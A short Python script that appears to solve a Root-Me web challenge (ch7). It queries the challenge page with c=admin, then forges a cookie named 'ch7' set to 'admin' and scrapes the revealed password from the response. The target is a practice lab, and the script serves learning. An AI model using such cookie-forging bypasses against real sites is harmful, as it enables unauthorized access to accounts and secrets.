import requests
from bs4 import BeautifulSoup
import re
session = requests.Session()
url = 'http://challenge01.root-me.org/web-serveur/ch7'

param = {'c':'admin'}

r = requests.get(url, params= param)
soup = BeautifulSoup(r.text, 'html.parser')
a_tags = soup.find_all('a')
if a_tags:
    last_a = a_tags[-1]
    content = None
    sibling = last_a.next_sibling
    while sibling and not content:
        if isinstance(sibling, str):
            content = sibling.strip()
        elif sibling.get_text(strip=True):
            content = sibling.get_text(strip=True)
        sibling = sibling.next_sibling
print(content)
session.cookies.set('ch7', 'admin')
r = session.get(url)
match = re.search(r'password : (.+)', r.text)
print(match.group(1))